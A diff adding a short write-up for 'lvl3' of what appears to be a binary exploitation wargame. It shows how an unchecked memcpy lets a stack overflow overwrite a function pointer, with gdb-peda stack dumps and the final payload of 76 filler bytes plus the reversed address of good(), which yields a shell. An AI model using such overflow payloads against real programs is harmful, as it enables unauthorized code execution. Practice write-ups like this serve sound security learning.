@@ -1,0 +1,43 @@
+## lvl3
+The goal is to get into `good @ 0x08048474` by using a stack overflow. The program reads
+input without checking the size, which gives us the chance to pop the stack.
+Current value of the function ptr is: `0x080484a4`
+
+The relevant code looks like this:
+```
+// copies n bytes (length of string) from
+// argv to buffer
+memcpy(buffer, argv[1], strlen(argv[1]));
+// writes n bytes of value 0 to the buffer
+memset(buffer, 0, strlen(argv[1]) - 4);
+```
+
+```
+gdb-peda$ break *0x08048530
+gdb-peda$ run $(python -c "print 'A' * 50")
+gdb-peda$ x/32x $esp
+0xbffffbd0:	0xbffffbf0	0xbffffe17	0x00000032	0x08048274
+0xbffffbe0:	0xb7fff930	0x00000000	0x000000bf	0xb7eb5f16
+0xbffffbf0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc00:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc10:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc20:	0x08044141	0x080483d0	0x00000000	0xb7e513fd
+(…)
+```
+
+So we need 19 words filling and the reversed address:
+
+```
+gdb-peda$ run $(python -c "print 'A' * 76 + '\x74\x84\x04\x08'")
+gdb-peda$ x/32x $esp
+0xbffffbb0:	0xbffffbd0	0xbffffdf9	0x00000050	0x08048274
+0xbffffbc0:	0xb7fff930	0x00000000	0x000000bf	0xb7eb5f16
+0xbffffbd0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbe0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbf0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc00:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc10:	0x41414141	0x41414141	0x41414141	0x08048474
+(…)
+```
+
+`continue` subsequently gives us shell.
